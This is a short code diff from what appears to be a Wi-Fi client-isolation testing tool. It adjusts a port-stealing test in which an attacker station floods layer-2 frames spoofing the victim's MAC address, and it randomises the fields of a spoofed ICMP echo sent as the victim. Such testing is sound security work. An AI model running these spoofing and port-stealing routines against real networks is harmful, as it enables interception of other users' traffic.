@@ -794,7 +794,7 @@ class Client2Client:
 		# Option three: test port stealing by letting the attacker to send a lot of layer-2 frames with src addr as the victim. 
 		elif self.options.c2c_port_steal is not None:
 			# Before calling this function, self.sup_attacker.mac is already modified to victim's MAC addr. 
-			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/Raw(b"port_steal")
+			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.routermac)/Raw(b"port_steal")
 			log(STATUS, f"Sending port stealing frames from attacker to gateway/router:       {repr(p)} (Ethernet destination is the gateway/router)")
 			for _ in range(100):
 				self.sup_attacker.send_eth(p)
@@ -813,7 +813,7 @@ class Client2Client:
 	
 	def send_uplink_frame(self):
 		if self.options.c2c_port_steal is not None:
-			ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP()
+			ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
 			p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"1234567890")
 			log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 			for _ in range(10):
